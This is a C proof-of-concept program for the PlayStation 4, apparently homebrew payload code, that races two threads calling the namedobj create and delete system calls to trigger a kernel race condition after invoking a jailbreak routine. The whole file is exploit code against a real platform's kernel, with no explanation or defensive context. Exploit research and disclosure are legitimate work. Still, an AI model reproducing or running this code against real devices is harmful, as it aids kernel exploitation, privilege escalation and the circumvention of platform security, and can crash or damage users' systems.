#include "ps4.h"

#define SYS_NAMEDOBJ_CREATE 557
#define SYS_NAMEDOBJ_DELETE 558

static int namedobj_create(const char* name, 
                            int fd, 
                            uint32_t flags) {
    return syscall(SYS_NAMEDOBJ_CREATE, name, fd, flags);
}

static int namedobj_delete(uint32_t handle, 
                            uint16_t flags) {
    return syscall(SYS_NAMEDOBJ_DELETE, handle, flags);
}

static volatile int g_handle  = -1;
static volatile int g_running =  1;

void* thread_delete(void* arg) {
    while (g_running) {
        if (g_handle != -1) {
            int h    = g_handle;
            g_handle = -1;
            namedobj_delete(h, 0x107);
        }
    }
    return NULL;
}

void* thread_create(void* arg) {
    while (g_running) {
        SceKernelEqueue eq;
        sceKernelCreateEqueue(&eq, "poc");
        int fd = (int)eq;

        if (fd < 0) continue;

        int h = namedobj_create("poc", fd, 0x107);
        if (h != -1) {
            g_handle = h;
        }
    }
    return NULL;
}

int _main(struct thread *td)
{
    UNUSED(td);

    initKernel();
    initLibc();

    jailbreak();
    initSysUtil();

    ScePthread tA, tB;

    printf_("=== namedobj race PoC ===\n");

    scePthreadCreate(&tA, NULL, thread_delete, NULL, "del");
    scePthreadCreate(&tB, NULL, thread_create, NULL, "cre");

    sceKernelSleep(10);
    g_running = 0;

    scePthreadJoin(tA, NULL);
    scePthreadJoin(tB, NULL);

    return 0;
}